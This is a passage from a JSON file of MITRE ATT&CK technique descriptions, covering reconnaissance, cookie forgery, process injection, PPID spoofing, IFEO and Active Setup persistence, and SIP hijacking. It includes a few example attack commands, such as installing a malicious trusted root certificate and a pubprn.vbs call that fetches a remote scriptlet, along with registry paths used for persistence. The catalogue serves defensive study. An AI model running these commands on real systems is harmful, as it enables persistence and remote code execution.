<code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)"
  ],
  "gather victim network information": [
    "Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199))."
  ],
  "gather victim network information: network security appliances": [
    "Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133))."
  ],
  "gather victim org information: determine physical locations": [
    "Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware Additions](https://attack.mitre.org/techniques/T1200))."
  ],
  "gather victim host information: hardware": [
    "Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200))."
  ],
  "search closed sources: purchase technical data": [
    "Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim\u2019s infrastructure.(Citation: ZDNET Selling Data) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078))."
  ],
  "forge web credentials: web cookies": [
    "Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.\n\nAdversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.\n\nOnce forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)"
  ],
  "cloud storage object discovery": [
    "Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure.\n\nCloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS (Citation: ListObjectsV2) and List Blobs in Azure(Citation: List Blobs) ."
  ],
  "process injection: portable executable injection": [
    "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. "
  ],
  "permission groups discovery: cloud groups": [
    "Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\n\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance).\n\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation)\n\nAdversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object."
  ],
  "communication through removable media": [
    "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access."
  ],
  "account manipulation: additional cloud credentials": [
    "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)"
  ],
  "account manipulation: additional cloud roles": [
    "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in Azure AD environments, an adversary with the Application Administrator role can add [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to their application's service principal. In doing so the adversary would be able to gain the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) Similarly, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nSimilarly, an adversary with the Azure AD Global Administrator role can toggle the \u201cAccess management for Azure resources\u201d option to gain the ability to assign privileged access to Azure subscriptions and virtual machines to Azure AD users, including themselves.(Citation: Azure AD to AD) "
  ],
  "multi-factor authentication interception": [
    "Adversaries may target multi-factor authentication (MFA) mechanisms, (I.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. (Citation: Operation Emmental)"
  ],
  "data encoding: non-standard encoding": [
    "Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) "
  ],
  "access token manipulation: parent pid spoofing": [
    "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)"
  ],
  "office application startup: office test": [
    "Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)\n\nThere exist user and global Registry keys for the Office Test feature:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started."
  ],
  "data from information repositories: sharepoint": [
    "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n"
  ],
  "data from information repositories: code repositories": [
    "Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.\n\nOnce adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)\n\n**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories."
  ],
  "system script proxy execution: pubprn": [
    "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S)."
  ],
  "network denial of service: reflection amplification": [
    "Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)"
  ],
  "server software component": [
    "Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.(Citation: volexity_0day_sophos_FW)"
  ],
  "implant internal image": [
    "Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victim\u2019s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)\n\nA tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)"
  ],
  "event triggered execution": [
    "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. "
  ],
  "event triggered execution: image file execution options injection": [
    "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n\nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)"
  ],
  "boot or logon autostart execution: active setup": [
    "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs."
  ],
  "unsecured credentials: cloud instance metadata api": [
    "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n"
  ],
  "subvert trust controls: sip and trust provider hijacking": [
    "Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)"
  ],
  "modify authentication process: reversible encryption": [
